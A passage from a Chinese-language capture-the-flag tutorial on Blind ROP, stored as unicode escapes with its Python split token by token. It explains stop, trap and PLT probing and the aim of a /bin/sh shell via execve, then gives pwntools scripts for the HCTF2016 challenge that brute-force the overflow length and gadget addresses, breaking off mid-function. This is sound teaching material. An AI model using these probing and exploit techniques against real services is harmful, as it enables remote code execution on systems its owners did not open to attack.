80fd\u901a\u8fc7\u7b80\u5355\u7684\u63a7\u5236\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u4e3a\u81ea\u5df1\u8bbe\u7f6e\u7684\u503c\uff0c\u4ece\u800c\u800c\u6765\u731c\u6d4b\u76f8\u5e94\u7684gadgets\u3002\u800c\u5f53\u6211\u4eec\u63a7\u5236\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u65f6\uff0c\u4e00\u822c\u6709\u4ee5\u4e0b\u51e0\u79cd\u60c5\u51b5\n\n\n\n\n\u7a0b\u5e8f\u76f4\u63a5\u5d29\u6e83\n\n\n\u7a0b\u5e8f\u8fd0\u884c\u4e00\u6bb5\u65f6\u95f4\u540e\u5d29\u6e83\n\n\n\u7a0b\u5e8f\u4e00\u76f4\u8fd0\u884c\u800c\u5e76\u4e0d\u5d29\u6e83\n\n\n\n\n\u4e3a\u4e86\u5bfb\u627e\u5408\u7406\u7684gadgets\uff0c\u6211\u4eec\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u4e24\u6b65\n\n\n\u5bfb\u627estop gadgets\n\n\n\u6240\u8c13\nstop gadget\n\u4e00\u822c\u6307\u7684\u662f\u8fd9\u6837\u4e00\u6bb5\u4ee3\u7801\uff1a\u5f53\u7a0b\u5e8f\u7684\u6267\u884c\u8fd9\u6bb5\u4ee3\u7801\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u8fdb\u5165\u65e0\u9650\u5faa\u73af\uff0c\u8fd9\u6837\u4f7f\u5f97\u653b\u51fb\u8005\u80fd\u591f\u4e00\u76f4\u4fdd\u6301\u8fde\u63a5\u72b6\u6001\u3002\n\n\n\n\n\u5176\u5b9estop gadget\u4e5f\u5e76\u4e0d\u4e00\u5b9a\u5f97\u662f\u4e0a\u9762\u7684\u6837\u5b50\uff0c\u5176\u6839\u672c\u7684\u76ee\u7684\u5728\u4e8e\u544a\u8bc9\u653b\u51fb\u8005\uff0c\u6240\u6d4b\u8bd5\u7684\u8fd4\u56de\u5730\u5740\u662f\u4e00\u4e2agadgets\u3002\n\n\n\n\n\u4e4b\u6240\u4ee5\u8981\u5bfb\u627estop gadgets\uff0c\u662f\u56e0\u4e3a\u5f53\u6211\u4eec\u731c\u5230\u67d0\u4e2agadgtes\u540e\uff0c\u5982\u679c\u6211\u4eec\u4ec5\u4ec5\u662f\u5c06\u5176\u5e03\u7f6e\u5728\u6808\u4e0a\uff0c\u7531\u4e8e\u6267\u884c\u5b8c\u8fd9\u4e2agadget\u4e4b\u540e\uff0c\u7a0b\u5e8f\u8fd8\u4f1a\u8df3\u5230\u6808\u4e0a\u7684\u4e0b\u4e00\u4e2a\u5730\u5740\u3002\u5982\u679c\u8be5\u5730\u5740\u662f\u975e\u6cd5\u5730\u5740\uff0c\u90a3\u4e48\u7a0b\u5e8f\u5c31\u4f1acrash\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u5728\u653b\u51fb\u8005\u770b\u6765\u7a0b\u5e8f\u53ea\u662f\u5355\u7eaf\u7684crash\u4e86\u3002\u56e0\u6b64\uff0c\u653b\u51fb\u8005\u5c31\u4f1a\u8ba4\u4e3a\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u5e76\u6ca1\u6709\u6267\u884c\u5230\u4efb\u4f55\u7684\nuseful gadget\n\uff0c\u4ece\u800c\u653e\u5f03\u5b83\u3002\u4f8b\u5b50\u5982\u4e0b\u56fe\n\n\n\n\n\u4f46\u662f\uff0c\u5982\u679c\u6211\u4eec\u5e03\u7f6e\u4e86\nstop gadget\n\uff0c\u90a3\u4e48\u5bf9\u4e8e\u6211\u4eec\u6240\u8981\u5c1d\u8bd5\u7684\u6bcf\u4e00\u4e2a\u5730\u5740\uff0c\u5982\u679c\u5b83\u662f\u4e00\u4e2agadget\u7684\u8bdd\uff0c\u90a3\u4e48\u7a0b\u5e8f\u4e0d\u4f1a\u5d29\u6e83\u3002\u63a5\u4e0b\u6765\uff0c\u5c31\u662f\u53bb\u60f3\u529e\u6cd5\u8bc6\u522b\u8fd9\u4e9bgadget\u3002\n\n\n\u8bc6\u522b gadgets\n\n\n\u90a3\u4e48\uff0c\u6211\u4eec\u8be5\u5982\u4f55\u8bc6\u522b\u8fd9\u4e9bgadgets\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6808\u5e03\u5c40\u4ee5\u53ca\u7a0b\u5e8f\u7684\u884c\u4e3a\u6765\u8fdb\u884c\u8bc6\u522b\u3002\u4e3a\u4e86\u66f4\u52a0\u5bb9\u6613\u5730\u8fdb\u884c\u4ecb\u7ecd\uff0c\u8fd9\u91cc\u5b9a\u4e49\u6808\u4e0a\u7684\u4e09\u79cd\u5730\u5740\n\n\n\n\nProbe\n\n\n\u63a2\u9488\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u60f3\u8981\u63a2\u6d4b\u7684\u4ee3\u7801\u5730\u5740\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u90fd\u662f64\u4f4d\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u76f4\u63a5\u4ece0x400000\u5c1d\u8bd5\uff0c\u5982\u679c\u4e0d\u6210\u529f\uff0c\u6709\u53ef\u80fd\u7a0b\u5e8f\u5f00\u542f\u4e86PIE\u4fdd\u62a4\uff0c\u518d\u4e0d\u6d4e\uff0c\u5c31\u53ef\u80fd\u662f\u7a0b\u5e8f\u662f32\u4f4d\u4e86\u3002\u3002\u8fd9\u91cc\u6211\u8fd8\u6ca1\u6709\u7279\u522b\u60f3\u660e\u767d\uff0c\u600e\u4e48\u53ef\u4ee5\u5feb\u901f\u786e\u5b9a\u8fdc\u7a0b\u7684\u4f4d\u6570\u3002\n\n\n\n\n\n\nStop\n\n\n\u4e0d\u4f1a\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\u7684stop gadget\u7684\u5730\u5740\u3002\n\n\n\n\n\n\nTrap\n\n\n\u53ef\u4ee5\u5bfc\u81f4\u7a0b\u5e8f\u5d29\u6e83\u7684\u5730\u5740\n\n\n\n\n\n\n\n\n\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5728\u6808\u4e0a\u6446\u653e\u4e0d\u540c\u987a\u5e8f\u7684\nStop\n\u4e0e \nTrap\n\u4ece\u800c\u6765\u8bc6\u522b\u51fa\u6b63\u5728\u6267\u884c\u7684\u6307\u4ee4\u3002\u56e0\u4e3a\u6267\u884cStop\u610f\u5473\u7740\u7a0b\u5e8f\u4e0d\u4f1a\u5d29\u6e83\uff0c\u6267\u884cTrap\u610f\u5473\u7740\u7a0b\u5e8f\u4f1a\u7acb\u5373\u5d29\u6e83\u3002\u8fd9\u91cc\u7ed9\u51fa\u51e0\u4e2a\u4f8b\u5b50\n\n\n\n\nprobe,stop,traps(traps,traps,...)\n\n\n\u6211\u4eec\u901a\u8fc7\u7a0b\u5e8f\u5d29\u6e83\u4e0e\u5426(\n\u5982\u679c\u7a0b\u5e8f\u5728probe\u5904\u76f4\u63a5\u5d29\u6e83\u600e\u4e48\u5224\u65ad\n)\u53ef\u4ee5\u627e\u5230\u4e0d\u4f1a\u5bf9\u6808\u8fdb\u884cpop\u64cd\u4f5c\u7684gadget\uff0c\u5982\n\n\nret\n\n\nxor eax,eax; ret\n\n\n\n\n\n\n\n\n\n\nprobe,trap,stop,traps\n\n\n\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u6837\u7684\u5e03\u5c40\u627e\u5230\u53ea\u662f\u5f39\u51fa\u4e00\u4e2a\u6808\u53d8\u91cf\u7684gadget\u3002\u5982\n\n\npop rax; ret\n\n\npop rdi; ret\n\n\n\n\n\n\n\n\n\n\nprobe, trap, trap, trap, trap, trap, trap, stop, traps\n\n\n\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u6837\u7684\u5e03\u5c40\u6765\u627e\u5230\u5f39\u51fa6\u4e2a\u6808\u53d8\u91cf\u7684gadget\uff0c\u4e5f\u5c31\u662f\u4e0ebrop gadget\u76f8\u4f3c\u7684gadget\u3002\n\u8fd9\u91cc\u611f\u89c9\u539f\u6587\u662f\u6709\u95ee\u9898\u7684\uff0c\u6bd4\u5982\u8bf4\u5982\u679c\u9047\u5230\u4e86\u53ea\u662fpop\u4e00\u4e2a\u6808\u53d8\u91cf\u7684\u5730\u5740\uff0c\u5176\u5b9e\u4e5f\u662f\u4e0d\u4f1a\u5d29\u6e83\u7684\uff0c\uff0c\n\u8fd9\u91cc\u4e00\u822c\u6765\u8bf4\u4f1a\u9047\u5230\u4e24\u5904\u6bd4\u8f83\u6709\u610f\u601d\u7684\u5730\u65b9\n\n\nplt\u5904\u4e0d\u4f1a\u5d29\uff0c\uff0c\n\n\n_start\u5904\u4e0d\u4f1a\u5d29\uff0c\u76f8\u5f53\u4e8e\u7a0b\u5e8f\u91cd\u65b0\u6267\u884c\u3002\n\n\n\n\n\n\n\n\n\n\n\n\n\u4e4b\u6240\u4ee5\u8981\u5728\u6bcf\u4e2a\u5e03\u5c40\u7684\u540e\u9762\u90fd\u653e\u4e0atrap\uff0c\u662f\u4e3a\u4e86\u80fd\u591f\u8bc6\u522b\u51fa\uff0c\u5f53\u6211\u4eec\u7684probe\u5904\u5bf9\u5e94\u7684\u5730\u5740\u6267\u884c\u7684\u6307\u4ee4\u8df3\u8fc7\u4e86stop\uff0c\u7a0b\u5e8f\u7acb\u9a6c\u5d29\u6e83\u7684\u884c\u4e3a\u3002\n\n\n\u4f46\u662f\uff0c\u5373\u4f7f\u662f\u8fd9\u6837\uff0c\u6211\u4eec\u4ecd\u7136\u96be\u4ee5\u8bc6\u522b\u51fa\u6b63\u5728\u6267\u884c\u7684gadget\u5230\u5e95\u662f\u5728\u5bf9\u54ea\u4e2a\u5bc4\u5b58\u5668\u8fdb\u884c\u64cd\u4f5c\u3002\n\n\n\u4f46\u662f\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u5411BROP\u8fd9\u6837\u7684\u4e00\u4e0b\u5b50\u5f39\u51fa6\u4e2a\u5bc4\u5b58\u5668\u7684gadgets\uff0c\u7a0b\u5e8f\u4e2d\u5e76\u4e0d\u7ecf\u5e38\u51fa\u73b0\u3002\u6240\u4ee5\uff0c\u5982\u679c\u6211\u4eec\u53d1\u73b0\u4e86\u8fd9\u6837\u7684gadgets\uff0c\u90a3\u4e48\uff0c\u6709\u5f88\u5927\u7684\u53ef\u80fd\u6027\uff0c\u8fd9\u4e2agadgets\u5c31\u662fbrop gadgets\u3002\u6b64\u5916\uff0c\u8fd9\u4e2agadgets\u901a\u8fc7\u9519\u4f4d\u8fd8\u53ef\u4ee5\u751f\u6210pop rsp\u7b49\u8fd9\u6837\u7684gadgets\uff0c\u53ef\u4ee5\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u8bc6\u522b\u8fd9\u4e2agadgets\u7684\u6807\u5fd7\u3002\n\n\n\u6b64\u5916\uff0c\u6839\u636e\u6211\u4eec\u4e4b\u524d\u5b66\u7684ret2libc_csu_init\u53ef\u4ee5\u77e5\u9053\u8be5\u5730\u5740\u51cf\u53bb0x1a\u5c31\u4f1a\u5f97\u5230\u5176\u4e0a\u4e00\u4e2agadgets\u3002\u53ef\u4ee5\u4f9b\u6211\u4eec\u8c03\u7528\u5176\u5b83\u51fd\u6570\u3002\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662fprobe\u53ef\u80fd\u662f\u4e00\u4e2astop gadget\uff0c\u6211\u4eec\u5f97\u53bb\u68c0\u67e5\u4e00\u4e0b\uff0c\u600e\u4e48\u68c0\u67e5\u5462\uff1f\u6211\u4eec\u53ea\u9700\u8981\u8ba9\u540e\u9762\u6240\u6709\u7684\u5185\u5bb9\u53d8\u4e3atrap\u5730\u5740\u5373\u53ef\u3002\u56e0\u4e3a\u5982\u679c\u662fstop gadget\u7684\u8bdd\uff0c\u7a0b\u5e8f\u4f1a\u6b63\u5e38\u6267\u884c\uff0c\u5426\u5219\u5c31\u4f1a\u5d29\u6e83\u3002\u770b\u8d77\u6765\u4f3c\u4e4e\u5f88\u6709\u610f\u601d.\n\n\n\u5bfb\u627ePLT\n\n\n\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u7a0b\u5e8f\u7684plt\u8868\u5177\u6709\u6bd4\u8f83\u89c4\u6574\u7684\u7ed3\u6784\uff0c\u6bcf\u4e00\u4e2aplt\u8868\u9879\u90fd\u662f16\u5b57\u8282\u3002\u800c\u4e14\uff0c\u5728\u6bcf\u4e00\u4e2a\u8868\u9879\u76846\u5b57\u8282\u504f\u79fb\u5904\uff0c\u662f\u8be5\u8868\u9879\u5bf9\u5e94\u7684\u51fd\u6570\u7684\u89e3\u6790\u8def\u5f84\uff0c\u5373\u7a0b\u5e8f\u6700\u521d\u6267\u884c\u8be5\u51fd\u6570\u7684\u65f6\u5019\uff0c\u4f1a\u6267\u884c\u8be5\u8def\u5f84\u5bf9\u51fd\u6570\u7684got\u5730\u5740\u8fdb\u884c\u89e3\u6790\u3002 \n\n\n\n\n\u6b64\u5916\uff0c\u5bf9\u4e8e\u5927\u591a\u6570plt\u8c03\u7528\u6765\u8bf4\uff0c\u4e00\u822c\u90fd\u4e0d\u5bb9\u6613\u5d29\u6e83\uff0c\u5373\u4f7f\u662f\u4f7f\u7528\u4e86\u6bd4\u8f83\u5947\u602a\u7684\u53c2\u6570\u3002\u6240\u4ee5\u8bf4\uff0c\u5982\u679c\u6211\u4eec\u53d1\u73b0\u4e86\u4e00\u7cfb\u5217\u7684\u957f\u5ea6\u4e3a16\u7684\u6ca1\u6709\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\u7684\u4ee3\u7801\u6bb5\uff0c\u90a3\u4e48\u6211\u4eec\u6709\u4e00\u5b9a\u7684\u7406\u7531\u76f8\u4fe1\u6211\u4eec\u9047\u5230\u4e86plt\u8868\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u901a\u8fc7\u524d\u540e\u504f\u79fb6\u5b57\u8282\uff0c\u6765\u5224\u65ad\u6211\u4eec\u662f\u5904\u4e8eplt\u8868\u9879\u4e2d\u95f4\u8fd8\u662f\u8bf4\u5904\u4e8e\u5f00\u5934\u3002\n\n\n\u63a7\u5236rdx\n\n\n\u5f53\u6211\u4eec\u627e\u5230plt\u8868\u4e4b\u540e\uff0c\u4e0b\u9762\uff0c\u6211\u4eec\u5c31\u8be5\u60f3\u529e\u6cd5\u6765\u63a7\u5236rdx\u7684\u6570\u503c\u4e86\uff0c\u90a3\u4e48\u8be5\u5982\u4f55\u786e\u8ba4strcmp\u7684\u4f4d\u7f6e\u5462\uff1f\u9700\u8981\u63d0\u524d\u8bf4\u7684\u662f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684\u7a0b\u5e8f\u90fd\u4f1a\u8c03\u7528strcmp\u51fd\u6570\uff0c\u6240\u4ee5\u5728\u6ca1\u6709\u8c03\u7528strcmp\u51fd\u6570\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5c31\u5f97\u5229\u7528\u5176\u5b83\u65b9\u5f0f\u6765\u63a7\u5236rdx\u7684\u503c\u4e86\u3002\u8fd9\u91cc\u7ed9\u51fa\u7a0b\u5e8f\u4e2d\u4f7f\u7528strcmp\u51fd\u6570\u7684\u60c5\u51b5\u3002\n\n\n\u4e4b\u524d\uff0c\u6211\u4eec\u5df2\u7ecf\u627e\u5230\u4e86brop\u7684gadgets\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u51fd\u6570\u7684\u524d\u4e24\u4e2a\u53c2\u6570\u4e86\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u6211\u4eec\u5b9a\u4e49\u4ee5\u4e0b\u4e24\u79cd\u5730\u5740\n\n\n\n\nreadable\uff0c\u53ef\u8bfb\u7684\u5730\u5740\u3002\n\n\nbad, \u975e\u6cd5\u5730\u5740\uff0c\u4e0d\u53ef\u8bbf\u95ee\uff0c\u6bd4\u5982\u8bf40x0\u3002\n\n\n\n\n\u90a3\u4e48\u6211\u4eec\u5982\u679c\u63a7\u5236\u4f20\u9012\u7684\u53c2\u6570\u4e3a\u8fd9\u4e24\u79cd\u5730\u5740\u7684\u7ec4\u5408\uff0c\u4f1a\u51fa\u73b0\u4ee5\u4e0b\u56db\u79cd\u60c5\u51b5\n\n\n\n\nstrcmp(bad,bad)\n\n\nstrcmp(bad,readable)\n\n\nstrcmp(readable,bad)\n\n\nstrcmp(readable,readable)\n\n\n\n\n\u53ea\u6709\u6700\u540e\u4e00\u79cd\u683c\u5f0f\uff0c\u7a0b\u5e8f\u624d\u4f1a\u6b63\u5e38\u6267\u884c\u3002\n\n\n\u6ce8\n\uff1a\u5728\u6ca1\u6709PIE\u4fdd\u62a4\u7684\u65f6\u5019\uff0c64\u4f4d\u7a0b\u5e8f\u7684ELF\u6587\u4ef6\u76840x400000\u5904\u67097\u4e2a\u975e\u96f6\u5b57\u8282\u3002\n\n\n\u90a3\u4e48\u6211\u4eec\u8be5\u5982\u4f55\u5177\u4f53\u5730\u53bb\u505a\u5462\uff1f\u6709\u4e00\u79cd\u6bd4\u8f83\u76f4\u63a5\u7684\u65b9\u6cd5\u5c31\u662f\u4ece\u5934\u5230\u5c3e\u4f9d\u6b21\u626b\u63cf\u6bcf\u4e2aplt\u8868\u9879\uff0c\u4f46\u662f\u8fd9\u4e2a\u5374\u6bd4\u8f83\u9ebb\u70e6\u3002\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u5982\u4e0b\u7684\u4e00\u79cd\u65b9\u6cd5\n\n\n\n\n\u5229\u7528plt\u8868\u9879\u7684\u6162\u8def\u5f84\n\n\n\u5e76\u4e14\u5229\u7528\u4e0b\u4e00\u4e2a\u8868\u9879\u7684\u6162\u8def\u5f84\u7684\u5730\u5740\u6765\u8986\u76d6\u8fd4\u56de\u5730\u5740\n\n\n\n\n\u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u4e0d\u7528\u6765\u56de\u63a7\u5236\u76f8\u5e94\u7684\u53d8\u91cf\u4e86\u3002 \n\n\n\u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u80fd\u78b0\u5de7\u627e\u5230strncmp\u6216\u8005strcasecmp\u51fd\u6570\uff0c\u5b83\u4eec\u5177\u6709\u548cstrcmp\u4e00\u6837\u7684\u6548\u679c\u3002\n\n\n\u5bfb\u627e\u8f93\u51fa\u51fd\u6570\n\n\n\u5bfb\u627e\u8f93\u51fa\u51fd\u6570\u65e2\u53ef\u4ee5\u5bfb\u627ewrite\uff0c\u4e5f\u53ef\u4ee5\u5bfb\u627eputs\u3002\u4e00\u822c\u73b0\u5148\u627eputs\u51fd\u6570\u3002\u4e0d\u8fc7\u8fd9\u91cc\u4e3a\u4e86\u4ecb\u7ecd\u65b9\u4fbf\uff0c\u5148\u4ecb\u7ecd\u5982\u4f55\u5bfb\u627ewrite\u3002\n\n\n\u5bfb\u627ewrite@plt\n\n\n\u5f53\u6211\u4eec\u53ef\u4ee5\u63a7\u5236write\u51fd\u6570\u7684\u4e09\u4e2a\u53c2\u6570\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u518d\u6b21\u904d\u5386\u6240\u6709\u7684plt\u8868\uff0c\u6839\u636ewrite\u51fd\u6570\u5c06\u4f1a\u8f93\u51fa\u5185\u5bb9\u6765\u627e\u5230\u5bf9\u5e94\u7684\u51fd\u6570\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u6709\u4e2a\u6bd4\u8f83\u9ebb\u70e6\u7684\u5730\u65b9\u5728\u4e8e\u6211\u4eec\u9700\u8981\u627e\u5230\u6587\u4ef6\u63cf\u8ff0\u7b26\u7684\u503c\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u6709\u4e24\u79cd\u65b9\u6cd5\u6765\u627e\u5230\u8fd9\u4e2a\u503c\n\n\n\n\n\u4f7f\u7528rop chain\uff0c\u540c\u65f6\u4f7f\u5f97\u6bcf\u4e2arop\u5bf9\u5e94\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u4e0d\u4e00\u6837\n\n\n\u540c\u65f6\u6253\u5f00\u591a\u4e2a\u8fde\u63a5\uff0c\u5e76\u4e14\u6211\u4eec\u4f7f\u7528\u76f8\u5bf9\u8f83\u9ad8\u7684\u6570\u503c\u6765\u8bd5\u4e00\u8bd5\u3002\n\n\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\n\n\n\n\nlinux\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u6700\u591a\u53ea\u80fd\u6253\u5f001024\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26\u3002\n\n\nposix\u6807\u51c6\u6bcf\u6b21\u7533\u8bf7\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u6570\u503c\u603b\u662f\u5f53\u524d\u6700\u5c0f\u53ef\u7528\u6570\u503c\u3002\n\n\n\n\n\u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u9009\u62e9\u5bfb\u627eputs\u51fd\u6570\u3002\n\n\n\u5bfb\u627eputs@plt\n\n\n\u5bfb\u627eputs\u51fd\u6570(\u8fd9\u91cc\u6211\u4eec\u5bfb\u627e\u7684\u662f plt)\uff0c\u6211\u4eec\u81ea\u7136\u9700\u8981\u63a7\u5236rdi\u53c2\u6570\uff0c\u5728\u4e0a\u9762\uff0c\u6211\u4eec\u5df2\u7ecf\u627e\u5230\u4e86brop gadget\u3002\u90a3\u4e48\uff0c\u6211\u4eec\u6839\u636ebrop gadget\u504f\u79fb9\u53ef\u4ee5\u5f97\u5230\u76f8\u5e94\u7684gadgets\uff08\u7531ret2libc_csu_init\u4e2d\u540e\u7eed\u53ef\u5f97\uff09\u3002\u540c\u65f6\u5728\u7a0b\u5e8f\u8fd8\u6ca1\u6709\u5f00\u542fPIE\u4fdd\u62a4\u7684\u60c5\u51b5\u4e0b\uff0c0x400000\u5904\u4e3aELF\u6587\u4ef6\u7684\u5934\u90e8\uff0c\u5176\u5185\u5bb9\u4e3a\\x7fELF\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u8fd9\u4e2a\u6765\u8fdb\u884c\u5224\u65ad\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5176payload\u5982\u4e0b\n\n\npayload = \nA\n*length +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)\n\n\n\n\n\u653b\u51fb\u603b\u7ed3\n\n\n\u6b64\u65f6\uff0c\u653b\u51fb\u8005\u5df2\u7ecf\u53ef\u4ee5\u63a7\u5236\u8f93\u51fa\u51fd\u6570\u4e86\uff0c\u90a3\u4e48\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u8f93\u51fa.text\u6bb5\u66f4\u591a\u7684\u5185\u5bb9\u4ee5\u4fbf\u4e8e\u6765\u627e\u5230\u66f4\u591a\u5408\u9002gadgets\u3002\u540c\u65f6\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u627e\u5230\u4e00\u4e9b\u5176\u5b83\u51fd\u6570\uff0c\u5982dup2\u6216\u8005execve\u51fd\u6570\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u653b\u51fb\u8005\u6b64\u65f6\u4f1a\u53bb\u505a\u4e0b\u4e8b\u60c5\n\n\n\n\n\u5c06socket\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u8f93\u5165\u8f93\u51fa\n\n\n\u5bfb\u627e\u201c/bin/sh\u201d\u7684\u5730\u5740\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6700\u597d\u662f\u627e\u5230\u4e00\u5757\u53ef\u5199\u7684\u5185\u5b58\uff0c\u5229\u7528write\u51fd\u6570\u5c06\u8fd9\u4e2a\u5b57\u7b26\u4e32\u5199\u5230\u76f8\u5e94\u7684\u5730\u5740\u3002\n\n\n\u6267\u884cexecve\u83b7\u53d6shell\uff0c\u83b7\u53d6execve\u4e0d\u4e00\u5b9a\u5728plt\u8868\u4e2d\uff0c\u6b64\u65f6\u653b\u51fb\u8005\u5c31\u9700\u8981\u60f3\u529e\u6cd5\u6267\u884c\u7cfb\u7edf\u8c03\u7528\u4e86\u3002\n\n\n\n\n\u4f8b\u5b50\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5HCTF2016\u7684\u51fa\u9898\u4eba\u5931\u8e2a\u4e86\u4e3a\u4f8b\uff0c\u76f8\u5173\u7684\u90e8\u7f72\u6587\u4ef6\u90fd\u653e\u5728\u4e86example\u6587\u4ef6\u5939\u4e0b\u7684\u5bf9\u5e94\u76ee\u5f55\u4e0b\u3002\u57fa\u672c\u601d\u8def\u5982\u4e0b\n\n\n\u786e\u5b9a\u6808\u6ea2\u51fa\u957f\u5ea6\n\n\ndef\n \ngetbufferflow_length\n():\n\n    \ni\n \n=\n \n1\n\n    \nwhile\n \n1\n:\n\n        \ntry\n:\n\n            \nsh\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n9999\n)\n\n            \nsh\n.\nrecvuntil\n(\nWelCome my friend,Do you know password?\n\\n\n)\n\n            \nsh\n.\nsend\n(\ni\n \n*\n \na\n)\n\n            \noutput\n \n=\n \nsh\n.\nrecv\n()\n\n            \nsh\n.\nclose\n()\n\n            \nif\n \nnot\n \noutput\n.\nstartswith\n(\nNo password\n):\n\n                \nreturn\n \ni\n \n-\n \n1\n\n            \nelse\n:\n\n                \ni\n \n+=\n \n1\n\n        \nexcept\n \nEOFError\n:\n\n            \nsh\n.\nclose\n()\n\n            \nreturn\n \ni\n \n-\n \n1\n\n\n\n\n\n\u6839\u636e\u4e0a\u9762\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\uff0c\u6808\u6ea2\u51fa\u7684\u957f\u5ea6\u4e3a72\u3002\u540c\u65f6\uff0c\u6839\u636e\u56de\u663e\u4fe1\u606f\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u5e76\u6ca1\u6709\u5f00\u542fcanary\u4fdd\u62a4\uff0c\u5426\u5219\uff0c\u5c31\u4f1a\u6709\u76f8\u5e94\u7684\u62a5\u9519\u5185\u5bb9\u3002\u6240\u4ee5\u6211\u4eec\u4e0d\u9700\u8981\u6267\u884cstack reading\u3002\n\n\n\u5bfb\u627e stop gadgets\n\n\n\u5bfb\u627e\u8fc7\u7a0b\u5982\u4e0b\n\n\ndef\n \nget_stop_addr\n(\nlength\n):\n\n    \naddr\n \n=\n \n0x400000\n\n    \nwhile\n \n1\n:\n\n        \ntry\n:\n\n            \nsh\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n9999\n)\n\n            \nsh\n.\nrecvuntil\n(\npassword?\n\\n\n)\n\n            \npayload\n \n=\n \na\n \n*\n \nlength\n \n+\n \np64\n(\naddr\n)\n\n            \nsh\n.\nsendline\n(\npayload\n)\n\n            \nsh\n.\nrecv\n()\n\n            \nsh\n.\nclose\n()\n\n            \nprint\n \none success addr: 0x\n%x\n \n%\n \n(\naddr\n)\n\n            \nreturn\n \naddr\n\n        \nexcept\n \nException\n:\n\n            \naddr\n \n+=\n \n1\n\n            \nsh\n.\nclose\n()\n\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u5c1d\u8bd564\u4f4d\u7a0b\u5e8f\u6ca1\u6709\u5f00\u542fPIE\u7684\u60c5\u51b5\uff0c\u56e0\u4e3a\u4e00\u822c\u662f\u8fd9\u4e2a\u6837\u5b50\u7684\uff0c\uff0c\uff0c\u5982\u679c\u5f00\u542f\u4e86\uff0c\uff0c\u90a3\u5c31\u6309\u7167\u5f00\u542f\u4e86\u7684\u65b9\u6cd5\u505a\uff0c\uff0c\u7ed3\u679c\u53d1\u73b0\u4e86\u4e0d\u5c11\uff0c\uff0c\u6211\u9009\u62e9\u4e86\u4e00\u4e2a\u8c8c\u4f3c\u8fd4\u56de\u5230\u6e90\u7a0b\u5e8f\u4e2d\u7684\u5730\u5740\n\n\none success stop gadget addr: 0x4006b6\n\n\n\n\n\u8bc6\u522bbrop gadgets\n\n\n\u4e0b\u9762\uff0c\u6211\u4eec\u6839\u636e\u4e0a\u9762\u4ecb\u7ecd\u7684\u539f\u7406\u6765\u5f97\u5230\u5bf9\u5e94\u7684brop gadgets\u5730\u5740\u3002\u6784\u9020\u5982\u4e0b\uff0cget_brop_gadget\u662f\u4e3a\u4e86\u5f97\u5230\u53ef\u80fd\u7684brop gadget\uff0c\u540e\u9762\u7684check_brop_gadget\u662f\u4e3a\u4e86\u68c0\u67e5\u3002\n\n\ndef\n \nget_brop_gadget\n(\nlength\n,\n \nstop_gadget\n,\n \naddr\n):\n\n    \ntry\n:\n\n        \nsh\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n9999\n)\n\n        \nsh\n.\nrecvuntil\n(\npassword?\n\\n\n)\n\n        \npayload\n \n=\n \na\n \n*\n \nlength\n \n+\n \np64\n(\naddr\n)\n \n+\n \np64\n(\n0\n)\n \n*\n \n6\n \n+\n \np64\n(\n\n            \nstop_gadget\n)\n \n+\n \np64\n(\n0\n)\n \n*\n \n10\n\n        \nsh\n.\nsendline\n(\npayload\n)\n\n        \ncontent\n \n=\n \nsh\n.\nrecv\n()\n\n        \nsh\n.\nclose\n()\n\n        \nprint\n \ncontent\n\n        \n# stop gadget returns memory\n\n        \nif\n \nnot\n \ncontent\n.\nstartswith\n(\nWelCome\n):\n\n            \nreturn\n \nFalse\n\n        